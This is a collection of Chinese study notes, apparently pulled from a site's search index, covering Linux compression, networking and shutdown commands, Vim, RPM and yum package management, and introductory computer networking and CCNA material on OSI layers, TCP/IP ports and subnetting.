命令英文原意：GNUzip 命令所在路径：/bin/gzip 执行权限：所有用户 语法：gzip [文件] 功能描述：压缩文件，不保留源文件 压缩后文件格式：.gz 解压命令：gunzip 命令名称：gunzip 命令英文原意：GNUunzip 命令所在路径：/bin/gunzip 执行权限：所有用户 语法：gunzip [压缩文件] 功能描述：解压缩.gz的压缩文件 范例：$gunzip boduo.gz 压缩保留源文件的方法： gzip –c filename > filename.gz 解压缩保留源文件的方法： gunzip –c filename.gz > filename 打包命令：tar 命令名称：tar 命令所在路径：/bin/tar 执行权限：所有用户 语法：tar 选项[-zcf] [压缩后文件名] [被压缩目录名] -c 打包 -v 显示详细信息 -f 指定文件名【必选】 -z 打包同时gzip压缩 功能描述：打包目录 压缩后文件格式：.tar.gz 解包命令：tar tar命令解压缩语法：tar 选项[-zxvf] [被压缩文件名] -x 解包 -v 显示详细信息 -f 指定解压文件 -z 解压缩gzip 范例：$tar -zxf abc.tar.gz 压缩命令：zip 命令名称：zip 命令所在路径：/usr/bin/zip 执行权限：所有用户 语法：zip 选项[-r] [压缩后文件名] [文件或目录] -r 压缩目录 功能描述：压缩文件或目录 压缩后文件格式：.zip 解压命令：unzip 命令名称：unzip 命令所在路径：/usr/bin/unzip 执行权限：所有用户 语法：unzip [压缩文件] 功能描述：解压.zip的压缩文件 范例：$unzip test.zip 压缩解命令：bzip2 【推荐压缩大文件】 命令名称：bzip2 命令所在路径：/usr/bin/bzip2 执行权限：所有用户 语法：bzip2 选项[-k] [文件] -k 产生压缩文件后保留原文件 -j 进行bzip2压缩 功能描述：压缩文件 压缩后文件格式：.bz2 范例： $bzip2 -k boduo $tar -cjf Japan.tar.bz2 Japan 打包且进行bzip2压缩 解压命令：bunzip2 命令名称：bunzip2 命令所在路径：/usr/bin/bunzip2 执行权限：所有用户 语法：bunzip2 选项[-k] [压缩文件] -k 解压缩后保留原文件 功能描述：解压缩 范例： $bunzip2 -k boduo.bz2 $tar -xjf Japan.tar.bz2 解包且进行bzip2解压 网络命令 网络命令：write 指令名称：write 指令所在路径：/usr/bin/write 执行权限：所有用户 语法：write 功能描述：给在线用户发信息，以Ctrl+D保存结束 范例：#write linzhiling 网络命令：wall 指令名称：wall 命令英文原意：write all 指令所在路径：/usr/bin/wall 执行权限：所有用户 语法：wall [message] 功能描述：发广播信息 范例：#wall ShenChao is a honest man！ 网络命令：ping 命令名称：ping 命令所在路径：/bin/ping 执行权限：所有用户 语法：ping 选项 IP地址 -c 指定发送次数 功能描述：测试网络连通性 范例：#ping -c 4 192.168.1.156 网络命令：ifconfig 命令名称：ifconfig 命令英文原意：interface configure 命令所在路径：/sbin/ifconfig 执行权限：root 语法：ifconfig 网卡名称 IP地址 功能描述：查看和设置网卡信息 范例：#ifconfig eth0 192.168.8.250 网络命令：mail 命令名称：mail 命令所在路径：/bin/mail 执行权限：所有用户 语法：mail [用户名] 功能描述：查看发送电子邮件 范例：#mail root 网络命令：last 命令名称：last 命令所在路径：/usr/bin/last 执行权限：所有用户 语法：last 功能描述：列出目前与过去登入系统的用户信息 范例：#last 网络命令：lastlog 命令名称：lastlog 命令所在路径：/usr/bin/lastlog 执行权限：所有用户 语法：lastlog 功能描述：检查某特定用户上次登录的时间 范例： lastlog lastlog -u 用户ID 网络命令：traceroute 命令名称：traceroute 命令所在路径：/bin/traceroute 执行权限：所有用户 语法：traceroute 功能描述：显示数据包到主机间的路径 范例：traceroute www.lampbrother.net 网络命令：netstat 命令名称：netstat 命令所在路径：/bin/netstat 执行权限：所有用户 语法：netstat [选项] 功能描述：显示网络相关信息 选项： -t: TCP协议 -u: UDP协议 -l：监听 -r：路由 -n：显示IP地址和端口号 范例： netstat -tlun 查看本机监听的端口 netstat -an 查看本机所有的网络连接 netstat -rn 查看本机路由表（查看网关） 网络命令：setup（Redhat专有） 命令名称：setup 命令所在路径：/usr/bin/setup 执行权限：root 语法：setup 功能描述：配置网络 范例：#setup 挂载命令（命令行界面需要） 命令名称：mount 命令位置：/bin/mount 执行权限：所有用户 命令语法：mount [-t文件系统] 设备文件名 挂载点（需存在，可自建） 范例： mount -t iso9660 /dev/sr0 /mnt/cdrom umount /dev/sr0 卸载设备（不可在设备目录下执行） 关机重启命令 shutdown命令 语法：shutdown [选项] 时间 选项： -c：取消前一个关机命令 -h：关机 -r：重启 其他关机命令 [root@localhost~]#halt [root@localhost~]#poweroff #相对于直接断电 [root@localhost~]#init 0 其他重启命令 [root@localhost~]#reboot [root@localhost~]#init 6 系统运行级别 0 关机 1 单用户（类似于安全模式） 2 不完全多用户，不含NFS服务 3 完全多用户 4 未分配 5 图形界面 6 重启 [root@localhost~]#cat /etc/inittab systemctl set-default multi-user.target #设定为命令行启动 [root@localhost~]#runlevel #查询系统运行级别 退出登录命令 [root@localhost~]#logout （Windows为win+L） Copyright © by None，使用知识共享署名-非商业性使用-相同方式共享 4.0 国际许可协议发布            此页面修订于： 2020-07-21 11:18 "},"兄弟连Linux/文本编辑器Vim.html":{"url":"兄弟连Linux/文本编辑器Vim.html","title":"文本编辑器Vim","keywords":"","body":"文本编辑器Vim Vim简介 Vim是一个功能强大的全屏幕文本编辑器，是Linux/UNIX上最常用的文本编辑器，它的作用是建立、编辑、显示文本文件。 Vim没有菜单，只有命令。 插入命令 命令 作用 a 在光标所在字符后插入 A 在光标所在行行尾插入 i 在光标所在字符前插入 I 在光标所在行行首插入 小写o 在光标下插入新行 大写O 在光标上插入新行 定位命令 命令 作用 :set nu 设置行号 :set nonu 取消行号 gg 到第一行 G 到最后一行 nG 到第n行 :n 到第n行 $ 移至行尾 数字0 移至行首 删除命令 命令 作用 x 删除光标所在处的字符 nx 删除光标所在处后n个字符 dd 删除光标所在行，ndd删除n行 dG 删除光标所在行到文件末尾内容 D 删除光标所在处到行尾内容 :n1,n2d 删除指定范围的行:3,9d删除3-9行 复制剪切命令 命令 作用 yy 复制当前行 nyy 复制当前行以下n行 dd 剪切当前行 ndd 剪切当前行以下n行 p、P 粘贴在当前光标所在行下或行上 替换取消命令 命令 作用 r 取代光标所在处的字符 R 从光标所在处开始替换字符，按Esc结束 u 取消上一步操作 搜索替换命令 命令 作用 /string 搜索指定字符串；搜索时忽略大小写:set ic n 搜索指定字符串的下一个出现位置 :%/old/new/g 全文替换指定字符串 g=>c 询问确认 :n1,n2s/old/new/g 在一定范围内替换指定字符串 保存退出命令 命令 作用 :w 保存修改 :w newfilename 另存为指定文件 :wq 保存修改并退出 ZZ 快捷键，保存修改并退出 :q! 不保存修改退出 :wq! 保存修改并退出（文件所有者及root可用） Vim使用技巧 将配置写在/home/username/.vimrc或/root/.vimrc中以免下次重写（需自建.vimrc） :! 命令 如：:!date Sat Nov 16 23:15:56 CST 2019 在不退出vim的情况下执行命令 :r 文件名 导入文件内容到vim里 :r !命令 将命令的执行结果导入vim :map 快捷键 触发命令 若要将快捷键设置为Ctrl+P，实际按键为Ctrl+V+P也可先按Ctrl+V再按Ctrl+P 范例： :map ^P I# 设置Ctrl+P快捷键，使光标所在行首添加“#” :map ^B 0x 设置Ctrl+B快捷键，使删除光标所在行首字符 :ab 原内容 替换内容 Copyright © by None，使用知识共享署名-非商业性使用-相同方式共享 4.0 国际许可协议发布            此页面修订于： 2020-07-20 16:27 "},"兄弟连Linux/软件包管理.html":{"url":"兄弟连Linux/软件包管理.html","title":"软件包管理","keywords":"","body":"软件包管理 软件包分类 源码包 二进制包（RPM包、DEB包系统默认包） 源码包 源码包的优点是： 开源，如果有足够的能力，可以修改源代码 可以自由选择所需的功能 软件是编译安装，所以更加适合自己的系统，更加稳定也效率更高 卸载方便 源码包的缺点： 安装过程步骤较多，尤其安装较大的软件集合时（如LAMP环境搭建），容易出现拼写错误 编译过程时间较长，安装比二进制安装时间长 因为是编译安装，安装过程中一旦报错新手很难解决 RPM包 二进制包的优点： 包管理系统简单，只通过几个命令就可以实现包的安装、升级、查询和卸载 安装速度比源码包安装快的多 二进制包缺点： 经过编译，不再可以看到源代码 功能选择不如源码包灵活 依赖性 RPM包命名原则 httpd-2.2.15-15.el6.centos.1.i686.rpm httpd——软件包名 2.2.15——软件版本 15——软件发布的次数 el6.centos——适合的Linux平台 i686——适合的硬件平台 rpm——rpm包扩展名 RPM包依赖性 树形依赖：a>b>c 环形依赖：a>b>c>a（一条命令同时安装abc） 模块依赖：模块依赖查询网站：www.rpmfind.net（以.so .数字结尾的安装包某个软件包里的软件，需要安装对应的软件包） 包全名与包名 包全名：操作的包是没有安装的软件包时，使用包全名。而且要注意路径 包名：操作已经安装的软件包时，使用包名。是搜索/var/lib/rpm/中的数据库 RPM包安装升级卸载 安装 rpm -ivh 包全名 选项： -i（install） 安装 -v（verbose） 显示详细信息 -h（hash） 显示进度 --nodeps 不检测依赖性 升级 rpm -Uvh 包全名 选项： -U（upgrade） 升级 卸载 rpm -e 包名 选项： -e（erase） 卸载 --nodeps 不检查依赖性 查询软件是否安装 [root@localhost~]#rpm -q 包名 #查询包是否安装 选项： -q 查询（query） [root@localhost~]#rpm -qa #查询所有已经安装的RPM包 选项： -a 所有（all） 查询软件包详细信息 [root@localhost~]#rpm -qi 包名 #查询软件信息 选项： -i 查询软件信息（information） -p 查询未安装包信息（package） [root@localhost~]#rpm -qip 包全名 #查询未安装软件信息 查询包中文件安装位置 [root@localhost~]#rpm -ql 包名 选项： -l 列表（list） -p 查询未安装包信息（package） 查询系统文件属于哪个RPM包 [root@localhost~]#rpm -qf 文件名 选项： -f 查询系统文件属于哪个软件包（file） 查询软件包的依赖性 [root@localhost~]#rpm -qR 包名 【需在包目录下】 选项： -R 查询软件包的依赖性（requires） -p 查询未安装包信息（package） RPM包校验 [root@localhost~]#rpm -V 已安装的包名 选项： -V 校验指定RPM包中的文件（verify）【用于判断文件是否被更改】 验证内容中的8个信息的具体内容如下：【没反馈即ok，没变化为“.”】 S 文件大小是否改变 M 文件的类型或文件的权限（rwx）是否被改变 5 文件MD5校验和是否改变（可以看成文件内容是否改变） D 设备的中，从代码是否改变 L 文件路径是否改变 U 文件的属主（所有者）是否改变 G 文件的属组是否改变 T 文件的修改时间是否改变 文件类型 c 配置文件（config file） d 普通文档（documentation） g “鬼”文件（ghost file），很少见，就是该文件不应该被这个RPM包包含 l 授权文件（license file） r 描述文件（read me） RPM包中文件提取 [root@localhost~]#rpm2cpio 包全名 | cpio -idv .文件绝对路径 rpm2cpio #将pm包转换为cpio格式的命令（2与to同音，所以；\".\"为当前目录下） cpio #是一个标准工具，它用于创建软件档案文件和从档案文件中提取文件 [root@localhost~]#cpio 选项 选项： -i：copy-in模式，还原 -d：还原时自动新建目录 -v：显示还原过程 例如： [root@localhost ~]#rpm -qf /bin/ls 查询ls命令属于哪个软件包 [root@localhost~]#mv /bin/ls /tmp/ 造成ls命令误删除假象 [root@localhost ~]#rpm2cpio /mnt/cdrom/Packages/coreutils-8.4-19.el6.i686.rpm | cpio -idv ./bin/ls 提RPM包中ls命令到当前目录的/bin/ls下 [root@localhost~]#cp /root/bin/ls /bin/ 把ls命令复制会/bin/目录，修复文件丢失 安装位置 RPM包默认安装位置 安装位置 说明 /etc/ 配置文件安装目录 /usr/bin/ 可执行的命令安装目录 /usr/lib/ 程序所使用的函数库保存位置 /usr/share/doc/ 基本的软件使用手册保存位置 /usr/share/man/ 帮助文件保存位置 源码包安装位置 安装在手动指定位置当中，一般是/usr/local/软件名/ 安装位置不同带来的影响 RPM包安装的服务可以使用系统服务管理命令（service）来管理，例如RPM包安装的apache的启动方法是： /usr/sbin/httpd start （可用which httpd查看绝对路径） systemctl start httpd.service 而源码包安装的服务则不能被服务管理命令管理，因为没有安装到默认路径中。所以只能用绝对路径进行服务的管理，如： /usr/local/apache2/bin/apachectl start 源码包安装 安装准备 安装C语言编译器 下载源码包 http://mirror.bit.edu.cn/apache/httpd/ 安装注意事项 源代码保存位置：/usr/local/src/ 软件安装位置：/usr/local/ 如何确定安装过程报错： 安装过程停止 并出现error、warning或no的提示 源码包安装过程 下载源码包 解压缩下载的源码包 进入解压缩目录，查看安装说明INSTALL $ ./configure --prefix=安装路径 软件配置与检查 定义需要的功能选项。 检测系统环境是否符合安装要求。 把定义好的功能选项和检测系统环境的信息都写入Makefile文件，用于后续的编辑。 $ make 编译【如有报错，用make clean清除产生的编译文件】 $ make install 编译安装 $ 安装路径/bin/apachectl start 启动 脚本安装包 脚本安装并不是独立的软件包类型，常见安装的是源码包。 是人为把安装过程写成了自动安装的脚本，只要执行脚本，定义简单的参数，就可以完成安装。 非常类似于Windows下软件的安装方式。 Webmin的作用 Webmin是一个基于Web的Linux系统管理界面。您就可以通过图形化的方式设置用户帐号、Apache、DNS、文件共享等服务。 Webmin安装过程 下载软件 http://sourceforge.net/projects/webadmin/files/webmin/ 解压缩，并进入加压缩目录 执行安装脚本 常用yum命令 查询 [root@localhost~]#yum list #查询所有可用软件包列表 [root@localhost~]#yum search 关键字 #搜索服务器上所有和关键字相关的包 安装 [root@localhost~]#yum -y install 包名 选项： install 安装 -y 自动回答yes 升级 [root@localhost~]#yum -y update 包名 【如果没有加包名会升级所有内容包括内核，慎用！】 选项： update 升级 -y 自动回答yes 卸载 [root@localhost~]#yum -y remove 包名 选项： remove 卸载 -y 自动回答yes YUM软件组管理命令 [root@localhost ~]#yum grouplist #列出所有可用的软件组列表 [root@localhost ~]#yum groupinstall软件组名 #安装指定软件组，组名可以由grouplist查询出来 [root@localhost ~]#yum groupremove软件组名 #卸载指定软件组 光盘yum源搭建步骤 挂载光盘 [root@localhost~]#mount /dev/sr0 /mnt/cdrom/ 让网络yum源文件失效 [root@localhost-]#cd /etc/yum.repos.d/ [root@localhost yum.repos.d]#mv CentOS-Base.repo CentOS-Base.repo.bak [root@localhost yum.repos.d]#mv CentOS-Debuginfo.repo CentOS-Debuginfo.repo.bak [root@localhost yum.repos.d]#mv CentOS-Vault.repo CentOS-Vault.repo.bak 修改光盘yum源文件 [root@localhost yum.repos.d]#vim CentOS-Media.repo baseurl=file://mnt/cdrom #地址为你自己的光盘挂载地址 #file:///media/cdrom/ #并注释这两个不存在的地址 #file:///media/cdrecorder/ gpgcheck=1 enabled=1 #enabled=0改为enabled=1，让这个yum源配置文件生效 【配置文件格式要注意：注释要顶格】 Copyright © by None，使用知识共享署名-非商业性使用-相同方式共享 4.0 国际许可协议发布            此页面修订于： 2020-07-21 11:27 "},"韩立刚计算机网络/概述.html":{"url":"韩立刚计算机网络/概述.html","title":"概述","keywords":"","body":"概述 主机（端系统）： 位于“网络边缘” 运行网络应用程序如：Web，email 客户/服务器（client/server）应用模型： 客户发送请求，接收服务器响应 如：Web应用，文件传输FTP应用 对等（peer to peer，P2P）应用模型： 无（或不仅依赖）专用服务器·通信在对等实体之间直接进行 如：Gnutella，BT，Skype，QQ OSI七层模型 应用层 能够产生网络流量能够和用户交互的应用程序 表示层 加密 、压缩 会话层 服务端和客户端建立的会话 、查木马 netstat -nb 传输层 可靠传输建立会话 、不可靠传输 、流量控制 网络层 IP地址编址 、选择最佳路径 数据链路层 数据如何封装 、添加物理层地址MAC 物理层 电压 、接口标准 数据交换的类型： 电路交换 最典型电路交换网络：电话网络 电路交换的三个阶段： 建立连接（呼叫/电路建立） 通信 释放连接（拆除电路） 独占资源 报文交换 一个信息体整体发送 分组交换 分组：报文拆分出来的一系列相对较小的数据包 分组交换需要报文的拆分与重组 产生额外开销 报文交换与分组交换均采用存储-转发交换方式 区别： 报文交换以完整报文进行“存储-转发” 分组交换以较小的分组进行“存储-转发” 适用于突发数据传输网络 资源充分共享 简单、无需呼叫建立 可能产生拥塞（congestion）：分组延迟和丢失 需要协议处理可靠数据传输和拥塞控制 end. Copyright © by None，使用知识共享署名-非商业性使用-相同方式共享 4.0 国际许可协议发布            此页面修订于： 2020-07-20 10:44 "},"韩立刚计算机网络/物理层.html":{"url":"韩立刚计算机网络/物理层.html","title":"物理层","keywords":"","body":"物理层 物理层基本概念 物理层解决如何在连接各种计算机的传输媒体上传输数据比特流而不是指具体的传输媒体。 物理层的主要任务描述为：确定与传输媒体的接口的一些特性，即： 机械特性：接口形状，大小，引线数目 电气特性：规定电压范围（-5V到+5V） 功能特性：规定-5V表示0，+5V表示1 过程特性：也称规程特性，规定建立连接时各个相关部件的工作步骤 奈氏准则（模拟信号） 1924年，奈奎斯特（Nyquist）就推导出了著名的奈氏准则。他给出了在假定的理想条件下，为了避免码间串扰，码元的传输速率的上限值。 在任何信道中，码元传输的速率是有上限的，否则就会出现码间串扰的问题，使接收端对码元的判决（即识别）成为不可能。 如果信道的频带越宽，也就是能够通过的信号高频分量越多，那么就可以用更高的速率传送码元而不出现码间串扰。 理想低通信道的最高码元传输速率=2WBaud W是理想低通信道的带宽，单位为HZ Baud是波特，是码元传输速率的单位 香农定理（数字信号、模拟信号） 香农（Shannon）用信息论的理论推导出了带宽受限且有高斯白噪声干扰的信道的极限、无差错的信息传输速率。 信道的极限信息传输速率C可表达为C=W log2(1+S/N) b/s W为信道的带宽（以Hz为单位） S为信道内所传信号的平均功率 N为信道内部的高斯噪声功率 导向传输媒体 导向传输媒体中，电磁波沿着固体媒体传播。 双绞线 屏蔽双绞线 STP 无屏蔽双绞线 UTP 同轴电缆 50Ω同轴电缆：用于数字传输，由于多用于基带传输，也叫基带同轴电缆 75Ω同轴电缆：用于模拟传输，即宽带同轴电缆 光缆 单模光纤指只能传输一种电磁波模式，多模光纤只可以传输多个电磁波模式，实际上单模光纤和多模光纤之分，也就是纤芯的直径之分。单模光纤细，多模光纤粗。在有线电视网络中使用的光纤全是单模光纤，其传播特性好，带宽可达10GHZ，可以在一根光纤中传输60套PAL-D电视节目。 非导向传输媒体 非导向传输媒体就是指自由空间，其中的电磁波传输被称为无线传输 无线传输所使用的频段很广 短波通信主要是靠电离层的反射，但短波信道的通信质量较差 微波在空间主要是直线传播 地面微波接力通信 卫星通信 相关术语 通信的目的是传送消息。 数据（data）——运送消息的实体。 信号（signal）——数据的电气的或电磁的表现。 模拟信号——代表消息的参数的取值是连续的。 数字信号——代表消息的参数的取值是离散的。 码元（code）——在使用时间域的波形表示数字信号时，则代表不同离散数值的基本波形就成为码元。 在数字通信中常常用时间间隔相同的符号来表示一个二进制数字，这样的时间间隔内的信号称为二进制码元。而这个间隔被称为码元长度。1码元可以携带nbit的信息量 信道一般表示向一个方向传送信息的媒体。所以咱们说平常的通信线路往往包含一条发送信息的信道和一条接收信息的信道。 单向通信（单工通信）——只能有一个方向的通信而没有反方向的交互。 双向交替通信（半双工通信）——通信的双方都可以发送信息，但不能双方同时发送（当然也就不能同时接收）。 双向同时通信（全双工通信）——通信的双方可以同时发送和接收信息。 基带信号（即基本频带信号）——来自信源的信号。像计算机输出的代表各种文字或图像文件的数据信号都属于基带信号。基带信号就是发出的直接表达了要传输的信息的信号，比如我们说话的声波就是基带信号。 带通信号——把基带信号经过载波调制后，把信号的频率范围搬移到较高的频段以便在信道中传输（即仅在一段频率范围内能够通过信道）。 因此在传输距离较近时，计算机网络都采用基带传输方式由于在近距离范围内基带信号的衰减不大，从而信号内容不会发生变化。因此在传输距离较近时，计算机网络都采用基带传输方式。如从计算机到监视器、打印机等外设的信号就是基带传输的。 几种最基本的调制方法 调幅（AM）：载波的振幅随基带数字信号而变化。 调频（FM）：载波的频率随基带数字信号而变化。 调相（PM）：载波的初始相位随基带数字信号而变化。 常用编码 单极性不归零码 只使用一个电压值，用高电平表示1，没电压表示0。 双极性不归零码 用正电平和负电平分别表示二进制数据的1和0，正负幅值相等。 双极性归零码 正负零三个电平，信号本身携带同步信息。 曼彻斯特编码 bit中间有信号低-高跳变为0；bit中间有信号高-低跳变为1。 差分曼彻斯特编码 bit中间有信号跳变，bit与bit之间也有信号跳变，表示下一个bit为0。bit中间有信号跳变，bit与bit之间无信号跳变，表示下一个bit为1。 差分曼彻斯特编码与曼彻斯特编码相同，但抗干扰性能强于曼彻斯特编码。 Copyright © by None，使用知识共享署名-非商业性使用-相同方式共享 4.0 国际许可协议发布            此页面修订于： 2020-07-20 13:23 "},"韩立刚计算机网络/数据链路层.html":{"url":"韩立刚计算机网络/数据链路层.html","title":"数据链路层","keywords":"","body":"数据链路层 信道类型 点对点信道：这种信道使用一对一的点对点通信方式。 广播信道：这种信道使用一对多的广播通信方式，因此过程比较复杂。广播信道上连接的主机很多，因此必须使用专用的共享信道协议来协调这些主机的数据发送。 链路与数据链路 链路（link）：是一条点到点的物理线路段，中间没有任何其他的交换结点。 一条链路只是一条通路的一个组成部分。 数据链路（data link）：除了物理线路外，还必须有通信协议来控制这些数据的传输。若把实现这些协议的硬件和软件加到链路上，就构成了数据链路。 现最常用的方法是使用适配器（即网卡）来实现这些协议的硬件和软件。 一般的适配器都包括了数据链路层和物理层这两层的功能。 数据链路层传送的是帧 三个基本问题 封装成帧 封装成帧（framing）：就是在一段数据的前后分别添加首部和尾部，然后就构成了一个帧。确定帧的界限。 首部和尾部的一个重要作用就是进行帧定界。确保数据完整接收。 透明传输 当传送的帧是用文本文件组成的帧时（文本文件中的字都是从键盘上输入的），其数据部分显然不会出现像SOH或EOT这样的帧定界控制字符。可见不管从键盘上输入什么字符都可以放在这样的帧中传输过去，因此这样的传输就是透明传输。 但当数据部分是非ASCII码的文本文件时（如二进制代码的计算机程序或者图像等），情况就不同了。如果数据中的某个字节的二进制代码恰好和SOH或EOT这种控制字符一样，数据链路层就好错误地“找到帧的边界”，把部分帧收下（误以为是个完整的帧），而把剩下的那部分数据丢弃（这部分找不到帧定界控制字符SOH）。这种情况就不是透明传输，因为当遇到书中碰巧出现字符“EOT”时就传不过去了，而其后面的数据因找不到“SOH”被接收端当做无效帧而丢弃。但实际上数据中出现的字符“EOT”并非控制字符而仅仅是二进制数据00000100 。 为了解决透明传输问题，字节填充法或字符填充：在控制字符SOH、EOT的前面插入一个转义字符ESC（其十六进制编码是1B，二进制是00011011）。而接收端的数据链路层在把数据送往网络层之前删除这个插入的转义字符。 差错检测 现实的通信链路都不会是理想的。传输过程中，1可能变成0, 0 可能变成1 。这就叫比特差错。——误码率。 误码率和信噪比有很大的关系。 因此，在计算机网络传输数据时，必须采用各种差错控制技术。目前在数据链路层广泛使用了循环冗余检验（CRC）的检错技术。在数据链路层的CRC检验都是用硬件完成的，处理很迅速，因此不会延误数据的传输。（除数越大，校错能力越强） 对于通信质量良好的有线传输链路，数据链路层协议不使用确认和重传机制，即不要求数据链路层向上提供可靠传输的服务。如果在数据链路层传输数据时出现了差错并且需要进行改正，那么改正差错的任务就由上层协议（例如，运输层的TCP协议）来完成。 对于通信质量较差的无线传输链路，数据链路层协议使用确认和重传机制，数据链路层向上提供可靠传输的服务。 载波监听多点接入/碰撞检测 CSMA/CD CSMA/CD 表示 Carrier Sense Multiple Access with Collision Detection。 “多点接入”表示许多计算机以多点接入的方式连接在一根总线上。 “载波监听”是指每一个站在发送数据之前先要检测一下总线上是否有其他计算机在发送数据，如果有，则暂时不要发送数据，以免发生碰撞。 总线上并没有什么“载波”。因此， “载波监听”就是用电子技术检测总线上有没有其他计算机发送的数据信号。 特点： 使用 CSMA/CD 协议的以太网不能进行全双工通信而只能进行双向交替通信（半双工通信）。 每个站在发送数据之后的一小段时间内，存在着遭遇碰撞的可能性。 这种发送的不确定性使整个以太网的平均通信量远小于以太网的最高数据率。 争用期： 最先发送数据帧的站，在发送数据帧后至多经过时间 2τ（两倍的端到端往返时延）就可知道发送的数据帧是否遭受了碰撞。 以太网的端到端往返时延 2τ称为争用期，或碰撞窗口。 经过争用期这段时间还没有检测到碰撞，才能肯定这次发送不会发生碰撞。 以太网的端到端往返时延2t称为争用期，或碰撞窗口。通常，取51.2us为争用期的长度。 对于10Mb/s以太网，在争用期内可发送512bit，即64字节。 以太网在发送数据时，若前64字节未发生冲突，则后续的数据就不会最短有效帧长。 如果发生冲突，就一定是在发送的前64字节之内。 由于一检测到冲突就立即中止发送，这时已经发送出去的数据一定小于64字节。 以太网规定了最短有效帧长为64字节，凡长度小于64字节的帧都是由于冲突而异常中止的无效帧。 二进制指数类型退避算法 ： 发生碰撞的站在停止发送数据后，要推迟（退避）一个随机时间才能再发送数据。 确定基本退避时间，一般是取为争用期 2τ。 定义重传次数 k ，k≤10，即：k = Min[重传次数, 10] 从整数集合[0,1,…, (2k-1)]中随机地取出一个数，记为 r。重传所需的时延就是 r 倍的基本退避时间。 当重传达 16 次仍不能成功时即丢弃该帧，并向高层报告。 Copyright © by None，使用知识共享署名-非商业性使用-相同方式共享 4.0 国际许可协议发布            此页面修订于： 2020-07-20 13:27 "},"韩立刚CCNA/计算机网络.html":{"url":"韩立刚CCNA/计算机网络.html","title":"计算机网络","keywords":"","body":"计算机网络 OSI模型 应用层 表示层 会话层 netstat -nb查看进程连接 传输层 可靠传输：建立会话 流量控制 差错检查；不可靠传输：不建立会话，节省服务器资源 网络层 选择最佳路径 数据链路层 网络设备如何封装数据帧、设备地址MAC 物理层 电压标准 接口标准 网络排错和OSI参考模型 物理层 连接问题 数据链路层 MAC地址冲突、ADSL拨号密码错误 网络层 计算机网关设置错误、路由器路由表错误 应用程序问题 IE代理设置错误 网络安全 物理层安全 数据链路层安全 MAC地址认证、ADSL拨号上网账号密码、划分VLAN 网络层安全 路由器ACL 传输层安全 端口安全 应用层安全 网站安全、操作系统安全 网卡 MAC 物理地址 硬件地址 不能更改（可改注册表用管理员给的MAC）48位二进制组成，前24代表厂家，后24位由厂家自定；以16进制显示 集线器HUB：不安全、宽带共享、易发生通讯冲突 网桥：学习MAC地址表、隔绝冲突域提高通讯效率 交换机：由网桥演变而来（多口网桥），带宽独享、安全、全双工通信 路由器：负责在不同网段转发数据、隔绝广播（目标MAC全1即FFF…） 网络设备和OSI参考模型 集线器 物理层设备 交换机 基于MAC转发数据链路层设备 路由器 基于IP地址转发三层设备 在两个集线器之间连接一个网桥，网桥能够基于MAC地址表转发数据。如图所示，网桥有两个以太网接口E0和E1，并且知道E0对应哪些MAC地址，E1对应哪些MAC地址。当A计算机给B计算机发送一个数据帧，集线器将该数据帧扩散到所有的接口，网桥的E0接口收到该数据帧，查看目标MAC地址0260.8c01.222，该目标MAC对应E0接口，于是不转发到E1接口，这样就不影响C和D计算机的通信。 网桥将一个大的冲突域划分成两个冲突域，冲突域的数量增加了，但是冲突域减小了。网桥的一个接口就是一个冲突域。 如果网络中的计算机发送一个目标MAC地址为FFFF.FFFF.FFFF的数据帧，这样的数据帧称为广播（比如ARP协议就是使用广播解析对方MAC地址的），网桥将会将这样的帧转发到除了发送端口的所有端口。所有的端口在同一个广播域。 Copyright © by None，使用知识共享署名-非商业性使用-相同方式共享 4.0 国际许可协议发布            此页面修订于： 2020-07-20 13:34 "},"韩立刚CCNA/TCP&IP.html":{"url":"韩立刚CCNA/TCP&IP.html","title":"TCP&IP","keywords":"","body":"TCP/IP 应用层协议： HTTP：TCP+80 HTTPS：TCP+443 FTP：TCP+21（连接）、20（传输数据） SMTP：TCP+25 POP3：TCP+110 RDP：TCP+3389 DNS：UDP+53 IP访问Windows共享文件夹：TCP+445 SQL：TCP+1433 Telnet：TCP+23 SSH：TCP+22 传输层协议 https://www.jianshu.com/p/c4090b09e154 UDP TCP 是否连接 无连接 面向连接 是否可靠 不可靠传输，不使用流量控制和拥塞控制 可靠传输，使用流量控制和拥塞控制，建立会话（消耗系统资源），丢失重传 连接对象个数 支持一对一，一对多，多对一和多对多交互通信 只能是一对一通信 传输方式 面向报文 面向字节流 首部开销 首部开销小，仅8字节 首部最小20字节，最大60字节 适用场景 适用于实时应用（IP电话、视频会议、直播等） 适用于要求可靠传输的应用，例如文件传输 网络层协议： IP协议：选择最佳路径的协议（RIP OSPF EIGRP BGP） ICMP协议：测试网络状态的协议（ping） pathping www.baidu.com 跟踪路径，计算丢包情况（利用了TTL，从1开始依次增加TTL） tracert -d www.baidu.com 跟踪路由 IGMP协议：组播（多播） ARP协议：将计算机的IP地址解析成MAC地址 arp -a 查看arp表 arp -s ip mac 更改对应关系 其他 服务和端口的关系：服务与端口一一对应（端口不能重复） netstat -anb | find \"3389\"（a：查看侦听端口 n：以数字显示 b：显示程序） 关闭Network Connections服务，则无法更改网络设置 TCP/IP筛选不影响出去（建立连接）的流量 winXP防火墙不影响出去（建立连接）的流量 IPSec严格控制进出计算机的流量 TCP/IP筛选比防火墙等级高，防火墙依赖于Windows Firewall服务 运行“msconfig”查看服务 运行“wf.msc”查看防火墙 ping单向不通，可能是防火墙 Windows防火墙无法拦截反弹式木马（需用IPSec拦截木马流量，白名单规则） 数据包（数据+IP）+MAC=数据帧 MAC地址决定下一跳给哪个设备 IP地址决定最终设备 Copyright © by None，使用知识共享署名-非商业性使用-相同方式共享 4.0 国际许可协议发布            此页面修订于： 2020-07-20 13:48 "},"韩立刚CCNA/IP地址和子网.html":{"url":"韩立刚CCNA/IP地址和子网.html","title":"IP地址和子网","keywords":"","body":"IP地址和子网 二进制和十进制 00000001 1 00000010 2 00000100 4 00001000 8 00010000 16 00100000 32 01000000 64 10000000 128 10000000 128 11000000 192 11100000 224 11110000 240 11111000 248 11111100 252 11111110 254 11111111 255 IP地址：32位二进制 A类网络缺省子网掩码：255.0.0.0 B类网络缺省子网掩码：255.255.0.0 C类网络缺省子网掩码：255.255.255.0 保留的私网地址 A类10.0.0.0 B类172.16.0.0--172.31.0.0 C类192.168.0.0--192.168.255.0 本地环回地址：127.0.0.1 无法获取DHCP时的地址时，IP为169.254.0.0 等长子网划分 变长子网划分 主机号除4，余数为1、2能用 主机号除4，余数为3 的为广播地址 超网 余数为0,1,2,3可合并为一个网段，子网掩码左移2位；如上图合并为192.168.16.0/22 Copyright © by None，使用知识共享署名-非商业性使用-相同方式共享 4.0 国际许可协议发布            此页面修订于： 2020-07-21 13:27 